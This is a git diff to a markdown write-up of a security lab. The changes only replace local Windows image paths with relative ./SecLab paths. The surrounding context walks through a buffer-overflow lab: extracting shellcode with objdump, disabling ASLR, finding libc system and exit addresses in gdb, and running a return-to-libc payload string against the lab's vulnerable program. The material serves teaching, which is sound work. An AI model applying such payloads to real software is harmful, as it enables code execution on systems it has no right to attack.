@@ -98,7 +98,7 @@ objdump -d lab1 | grep '[0-9a-f]:' | grep -oP '\s\K[0-9a-f]+' | tr -d '\n' | sed
 
 #### d. Total summary of process:
 
-![image-20241104092251134](C:\Users\Admin\AppData\Roaming\Typora\typora-user-images\image-20241104092251134.png)
+![image-20241104092251134](./SecLab/image-20241104092251134.png)
 
 after running the `objdump` command you will get the shellcode to inject into the vuln program.
 
@@ -108,15 +108,15 @@ after running the `objdump` command you will get the shellcode to inject into th
 
 ### 1. turn off ASLR (Address Space Layout Randomization):
 
-![image-20241104092449640](C:\Users\Admin\AppData\Roaming\Typora\typora-user-images\image-20241104092449640.png)
+![image-20241104092449640](./SecLab/image-20241104092449640.png)
 
 ### 2. create an environment variable in Linux with the path of file lab1.asm:
 
-![image-20241104092724884](C:\Users\Admin\AppData\Roaming\Typora\typora-user-images\image-20241104092724884.png)
+![image-20241104092724884](./SecLab/image-20241104092724884.png)
 
 ### 3. use gdb:
 
-![image-20241104093358327](C:\Users\Admin\AppData\Roaming\Typora\typora-user-images\image-20241104093358327.png)
+![image-20241104093358327](./SecLab/image-20241104093358327.png)
 
 0xf7e50db0: Address of libc_system
 0xf7e449e0: Address of exit to avoid crashing
@@ -128,7 +128,7 @@ after running the `objdump` command you will get the shellcode to inject into th
 r $(python -c "print(20*'a' + '\xb0\x0d\xe5\xf7' + '\xe0\x49\xe4\xf7' + '\x39\xd9\xff\xff')")
 ```
 
-![image-20241104095520665](C:\Users\Admin\AppData\Roaming\Typora\typora-user-images\image-20241104095520665.png)
+![image-20241104095520665](./SecLab/image-20241104095520665.png)
 
 after doing, so you would use
 
